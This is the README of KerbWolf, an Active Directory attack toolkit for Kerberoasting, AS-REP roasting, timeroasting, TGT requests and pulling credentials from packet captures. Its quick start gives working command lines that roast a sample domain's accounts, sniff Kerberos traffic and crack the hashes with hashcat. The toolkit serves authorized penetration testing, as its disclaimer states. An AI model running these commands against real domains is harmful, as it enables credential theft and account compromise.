<p style="text-align: center">
  <a href="https://www.python.org/"></a>
  <a href="https://www.apache.org/licenses/LICENSE-2.0"></a>
</p>

# KerbWolf

Kerberos roasting and TGT attack toolkit for Active Directory.

KerbWolf extracts crackable hashes from Active Directory. 7 Kerberos encryption types (including RFC 8009 AES-SHA2), 4 attack types, 25 output formats including NTLM. hashcat has a mode for 18 of them; the six AES-SHA2 formats and the 120-byte MS-SNTP format have none.

## Pick a tool

| Command | Attack | Use it when you have | Needs credentials | Produces |
|---------|--------|----------------------|-------------------|----------|
| [`kw-roast`](commands/kw-roast.md) | TGS-REP Roast (Kerberoast) | A domain account, or one account without pre-authentication | Yes (password, hash, or ccache) | Service ticket hashes for SPN accounts |
| [`kw-asrep`](commands/kw-asrep.md) | AS-REP Roast | Usernames to try | No (LDAP discovery needs auth) | Hashes from accounts without pre-authentication |
| [`kw-timeroast`](commands/kw-timeroast.md) | Timeroasting (MS-SNTP) | A network path to a DC | No (LDAP discovery needs auth) | SNTP hashes for computer, gMSA, and trust accounts |
| [`kw-extract`](commands/kw-extract.md) | All (from pcap) | A pcap/pcapng capture, or somewhere to capture | No (offline) | Kerberos, SNTP, NTLM, and LDAP simple-bind credentials |
| [`kw-tgt`](commands/kw-tgt.md) | TGT acquisition | A password, hash, or key (pass-the-key) | Yes | A ccache for the other tools |

What the commands share (credentials, finding the DC, LDAP discovery, `-e`) is on [Common options](commands/common-options.md).

## Quick start

```bash
uv tool install kerbwolf        # or: pip install kerbwolf
```

The [installation guide](installation.md) covers the system Kerberos libraries and installing from source.

```mermaid
flowchart LR
    A["Get credentials<br/>(password, hash, key)"] --> B["kw-tgt<br/>Request TGT"]
    B --> C["admin.ccache"]
    C --> D["kw-roast --ldap<br/>Kerberoast"]
    C --> E["kw-asrep --ldap<br/>AS-REP Roast"]
    D & E --> F["hashes.txt"]
    F --> G["hashcat<br/>Crack offline"]
    G --> H["Passwords!"]

    Z["Packet capture<br/>(tcpdump, Wireshark)"] --> Y["kw-extract<br/>Parse pcap"]
    Y --> F

    style C fill:#2a2a4a,stroke:#8b8bff
    style F fill:#4a2020,stroke:#ff6b6b
    style H fill:#1a3a1a,stroke:#6bcb77
```



**With credentials**, get a TGT, Kerberoast every SPN account found over LDAP, and crack:

```bash
# 1. Get a TGT
kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!' -o admin.ccache

# 2. Kerberoast via LDAP (auto-discover service accounts)
kw-roast -k -c admin.ccache --ldap -o hashes.txt

# 3. Crack with hashcat: one mode per hash type and etype
hashcat -m 13100 hashes.txt wordlist.txt    # RC4
hashcat -m 19700 hashes.txt wordlist.txt    # AES256
```

Domain and username come from the ccache, so `-d` and `-u` aren't needed. DC is found via DNS SRV. No DNS? Add `--dc-ip`, and give the system Kerberos library a `krb5.conf` for the LDAP bind (see [Kerberos setup](installation.md#kerberos-setup)).

**Without credentials**, AS-REP roast named accounts or timeroast a RID range:

```bash
kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith -t svc_backup -o asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt    # RC4 AS-REP

kw-timeroast 10.0.0.1 -r 500-5000 -o hashes.txt
```

**From a capture**, AS-REQ Pre-Auth and everything else in it:

```bash
kw-extract capture.pcap -o capture-hashes.txt
tcpdump -i eth0 -w - port 88 | kw-extract -
```

## Where to go next

- **Run a tool**: the command pages above, each opening with examples.
- **Pick a hashcat mode**: the [Hash Reference](cracking/hash-reference.md) starts with the mode for every attack and etype.
- **Fix a hash that will not load or crack**: [Troubleshooting](troubleshooting.md) lists symptoms and causes.
- **Understand the attacks**: [Attacks](background/attacks.md), [Timeroasting](background/timeroasting.md) and [Encryption Types](background/encryption-types.md).
- **Estimate the work**: [Cracking Speed](cracking/speed.md) has measured rates and time to exhaust common keyspaces.
- **Write these hash lines yourself**: [Hashcat Internals](cracking/hashcat-internals.md) has the limits and accepted shapes of every mode.

## Disclaimer

KerbWolf is intended for authorized penetration testing, red team engagements, and security audits only. You must have explicit written permission from the system owner before attacking any Active Directory environment. Unauthorized access to computer systems is illegal. The authors are not responsible for any misuse or damage caused by this tool.

## Credits

Built on [Impacket](https://github.com/fortra/impacket) and [ldap3](https://github.com/cannatag/ldap3). Inspired by [Rubeus](https://github.com/GhostPack/Rubeus), [GetUserSPNs.py](https://github.com/fortra/impacket), and [hashcat](https://hashcat.net/).

## License

[Apache License 2.0](https://www.apache.org/licenses/LICENSE-2.0)
